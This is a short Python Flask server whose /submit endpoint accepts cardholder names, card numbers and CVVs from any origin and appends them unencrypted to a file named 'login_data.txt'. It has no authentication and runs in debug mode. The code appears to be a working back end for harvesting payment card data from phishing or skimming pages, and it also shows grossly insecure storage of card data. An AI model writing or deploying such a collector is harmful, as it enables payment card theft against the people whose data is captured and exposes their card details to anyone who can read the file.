from flask import Flask, request, jsonify
from flask_cors import CORS
import os

app = Flask(__name__)
CORS(app)

data_file = "login_data.txt"

@app.route("/submit", methods=["POST"])
def submit():

    data = request.get_json()

    name = data.get("name")
    card = data.get("card")
    cvv = data.get("cvv")

    with open(data_file, "a") as f:
        f.write(f"{name} {card} {cvv}\n")

    return jsonify({"status": "ok"})


if __name__ == "__main__":

    if not os.path.exists(data_file):
        open(data_file, "w").close()

    app.run(port=8000, debug=True)
